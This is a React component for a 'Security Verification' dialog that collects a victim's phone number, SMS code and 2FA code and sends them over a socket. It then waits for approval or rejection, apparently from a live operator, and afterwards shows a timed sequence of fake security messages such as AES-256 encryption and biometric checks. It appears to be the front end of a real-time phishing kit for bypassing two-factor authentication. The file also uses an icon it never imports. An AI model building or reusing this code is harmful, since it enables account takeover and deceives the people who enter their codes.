import { useState, useEffect } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Smartphone, MessageSquare, Key, Check, AlertTriangle } from "lucide-react";
import type { Task } from "@shared/schema";
import { useSocket } from "@/hooks/use-socket";

interface TaskModalProps {
  isOpen: boolean;
  onClose: () => void;
  task: Task | null;
  userId: string;
}

export function TaskModal({ isOpen, onClose, task, userId }: TaskModalProps) {
  const [answer, setAnswer] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [isSuccess, setIsSuccess] = useState(false);
  const [showSecureStart, setShowSecureStart] = useState(false);
  const [securityProgress, setSecurityProgress] = useState(0);
  const [currentSecurityMessage, setCurrentSecurityMessage] = useState("");
  const { emit, on, off } = useSocket();

  const securityMessages = [
    "Initializing secure connection...",
    "Encrypting user data with AES-256...",
    "Verifying digital certificates...",
    "Establishing secure tunnel...",
    "Authenticating with security servers...",
    "Validating biometric patterns...",
    "Cross-referencing security databases...",
    "Applying advanced encryption protocols...",
    "Scanning for security threats...",
    "Finalizing secure authentication...",
    "Security verification completed successfully!"
  ];

  // Reset state when modal opens/closes or task changes
  useEffect(() => {
    if (!isOpen || !task) {
      setAnswer("");
      setIsLoading(false);
      setError("");
      setIsSuccess(false);
      setShowSecureStart(false);
      setSecurityProgress(0);
      setCurrentSecurityMessage("");
    }
  }, [isOpen, task]);

  useEffect(() => {
    const handleTaskResponse = (data: { taskId: number; approved: boolean; feedback?: string }) => {
      console.log("Task response received in modal:", data, "Current task:", task);
      if (task && data.taskId === task.id) {
        setIsLoading(false);
        if (data.approved) {
          setIsSuccess(true);
          setAnswer("");
          setError("");
          // Auto-close modal after 2 seconds
          setTimeout(() => {
            setIsSuccess(false);
            onClose();
          }, 2000);
        } else {
          setError(data.feedback || "Verification failed. Please try again.");
          setAnswer("");
        }
      }
    };

    const handleAnswerSubmitted = (message: any) => {
      console.log("Answer submitted, showing secure start screen");
      setIsLoading(false);
      setError("");
      setShowSecureStart(true);
    };

    if (isOpen && task) {
      on("task_response", handleTaskResponse);
      on("answer_submitted", handleAnswerSubmitted);
    }

    return () => {
      off("task_response", handleTaskResponse);
      off("answer_submitted", handleAnswerSubmitted);
    };
  }, [task, on, off, onClose, isOpen]);

  const submitTask = () => {
    if (!task || !answer.trim()) return;

    setIsLoading(true);
    setError("");

    emit("user_submit_answer", {
      taskId: task.id,
      answer: answer.trim(),
      userId,
    });
  };

  const startSecurityProcess = () => {
    setSecurityProgress(0);
    setCurrentSecurityMessage(securityMessages[0]);
    
    // Simulate security process with progress
    let messageIndex = 0;
    const progressInterval = setInterval(() => {
      messageIndex++;
      if (messageIndex < securityMessages.length) {
        setCurrentSecurityMessage(securityMessages[messageIndex]);
        setSecurityProgress((messageIndex / (securityMessages.length - 1)) * 100);
      } else {
        clearInterval(progressInterval);
        // Complete security process and close modal
        setTimeout(() => {
          setShowSecureStart(false);
          setSecurityProgress(0);
          setCurrentSecurityMessage("");
          onClose();
        }, 1500);
      }
    }, 800);
  };

  const getTaskIcon = () => {
    switch (task?.type) {
      case "phone":
        return <Smartphone className="h-12 w-12 text-primary mb-3" />;
      case "sms":
        return <MessageSquare className="h-12 w-12 text-yellow-500 mb-3" />;
      case "twoFactor":
        return <Key className="h-12 w-12 text-green-500 mb-3" />;
      default:
        return null;
    }
  };

  const getTaskTitle = () => {
    switch (task?.type) {
      case "phone":
        return "Phone Number Verification";
      case "sms":
        return "SMS Code Verification";
      case "twoFactor":
        return "Two-Factor Authentication";
      default:
        return "Security Verification Task";
    }
  };

  const getTaskDescription = () => {
    switch (task?.type) {
      case "phone":
        return "Please enter your phone number for verification";
      case "sms":
        return "Enter the 6-digit code sent to your phone";
      case "twoFactor":
        return "Enter your 2FA authentication code";
      default:
        return "Complete the security verification step";
    }
  };

  const getPlaceholder = () => {
    switch (task?.type) {
      case "phone":
        return "+1 (555) 123-4567";
      case "sms":
        return "123456";
      case "twoFactor":
        return "123456";
      default:
        return "Enter your response...";
    }
  };

  const getMaxLength = () => {
    return task?.type === "sms" || task?.type === "twoFactor" ? 6 : undefined;
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader className="bg-gradient-to-r from-yellow-400 to-yellow-500 text-black p-4 -m-6 mb-4 rounded-t-lg">
          <DialogTitle className="flex items-center gap-2">
            <div className="bg-black/20 p-2 rounded-full">
              <Check className="h-4 w-4" />
            </div>
            Security Verification Task
          </DialogTitle>
        </DialogHeader>

        {showSecureStart ? (
          securityProgress > 0 ? (
            <div className="text-center py-8 space-y-6">
              <div className="w-16 h-16 mx-auto mb-4 bg-blue-100 rounded-full flex items-center justify-center">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
              </div>
              <div className="space-y-4">
                <h3 className="text-lg font-semibold text-blue-600">Security Process Active</h3>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div 
                    className="bg-blue-600 h-2 rounded-full transition-all duration-300" 
                    style={{ width: `${securityProgress}%` }}
                  ></div>
                </div>
                <p className="text-sm text-muted-foreground font-mono">
                  {currentSecurityMessage}
                </p>
                <div className="text-xs text-gray-500">
                  {Math.round(securityProgress)}% Complete
                </div>
              </div>
            </div>
          ) : (
            <div className="text-center py-8 space-y-6">
              <div className="w-16 h-16 mx-auto mb-4 bg-blue-100 rounded-full flex items-center justify-center">
                <Shield className="w-8 h-8 text-blue-600" />
              </div>
              <div className="space-y-4">
                <h3 className="text-lg font-semibold">Security Verification Complete</h3>
                <p className="text-sm text-muted-foreground">
                  Your verification has been submitted successfully. To finalize the security process and protect your account, click the button below to initiate advanced security protocols.
                </p>
                <Button 
                  onClick={startSecurityProcess}
                  className="w-full bg-blue-600 hover:bg-blue-700"
                >
                  <Shield className="w-4 h-4 mr-2" />
                  Start Secure Process
                </Button>
              </div>
            </div>
          )
        ) : isSuccess ? (
          <div className="text-center py-8 space-y-4">
            <div className="w-16 h-16 mx-auto mb-4 bg-green-100 rounded-full flex items-center justify-center">
              <Check className="w-8 h-8 text-green-600" />
            </div>
            <h3 className="text-lg font-semibold text-green-600 mb-2">Verification Successful!</h3>
            <p className="text-sm text-muted-foreground">Your task has been approved. This window will close shortly.</p>
          </div>
        ) : !isLoading ? (
          <div className="space-y-6">
            <div className="text-center">
              {getTaskIcon()}
              <h6 className="font-semibold text-lg">{getTaskTitle()}</h6>
              <p className="text-muted-foreground text-sm mt-1">
                {getTaskDescription()}
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="task-answer" className="text-sm font-medium">
                {task?.type === "phone" ? "Phone Number" : 
                 task?.type === "sms" ? "SMS Code" : "2FA Code"}
              </Label>
              <Input
                id="task-answer"
                type={task?.type === "phone" ? "tel" : "text"}
                value={answer}
                onChange={(e) => setAnswer(e.target.value)}
                placeholder={getPlaceholder()}
                maxLength={getMaxLength()}
                className={`text-center ${task?.type !== "phone" ? "text-lg tracking-widest" : ""}`}
                onKeyPress={(e) => e.key === "Enter" && submitTask()}
              />
            </div>

            {error && (
              <Alert variant="destructive">
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription>
                  <strong>Verification Failed:</strong> {error}
                </AlertDescription>
              </Alert>
            )}

            <div className="flex gap-2 pt-4">
              <Button variant="outline" onClick={onClose} className="flex-1">
                Cancel
              </Button>
              <Button 
                onClick={submitTask} 
                className="flex-1"
                disabled={!answer.trim()}
              >
                <Check className="h-4 w-4 mr-2" />
                Submit
              </Button>
            </div>
          </div>
        ) : (
          <div className="text-center py-8 space-y-4">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary mx-auto"></div>
            <p className="text-muted-foreground">Verifying your information...</p>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}
